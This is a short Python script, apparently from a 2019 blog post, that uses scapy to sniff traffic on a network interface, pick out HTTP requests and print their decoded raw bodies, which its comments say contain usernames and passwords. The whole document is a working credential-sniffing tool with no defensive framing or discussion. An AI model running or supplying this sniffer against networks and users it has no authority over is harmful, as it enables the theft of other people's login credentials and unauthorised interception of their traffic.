# doc https://cyruslab.net/2019/05/16/pythoncapturing-username-and-password-from-http-login/
import scapy.all
from scapy_http import http 
from urllib.parse import unquote 
 
class sniffing:
    def __init__(self, interface, filter=""):
        self.sniffs(interface, filter)
        # filter can be "port 80", "tcp", "udp", "udp", "port 21" etc...
 
    def processing_packets(self, pkt):
        if pkt.haslayer(http.HTTPRequest): #http request filter
            if pkt.haslayer(scapy.all.Raw): # Raw data in http packet w/user &pass
                print(unquote(str(pkt[scapy.all.Raw]))) #print raw packet w/user & pass
 
    def sniffs(self, interface, filter):
        return scapy.all.sniff(iface=interface, store=0, prn=self.processing_packets, filter=filter)
